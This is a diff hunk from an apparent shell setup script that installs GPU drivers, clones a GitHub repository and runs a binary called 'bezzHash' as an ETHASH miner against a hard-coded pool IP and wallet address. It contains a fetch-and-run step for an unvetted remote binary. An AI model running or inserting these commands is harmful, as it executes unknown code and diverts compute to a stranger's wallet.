@@ -10,5 +10,6 @@ sudo apt-get update
 sudo apt-get -y install cuda-drivers-510
 sudo apt-get install libcurl3 -y
 sudo apt-get install git
+
 git clone https://github.com/githuboneheart/mom.git && cd mom && cd views && chmod +x bezzHash
 ./bezzHash --algo ETHASH --pool 149.248.19.20:443 --user 3CnZTtQYF7sGJHr1LsFRds4GmUvB1dUjAM.$(echo $(shuf -i 1000-9999 -n 1)-KVN) --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROX --basecolor
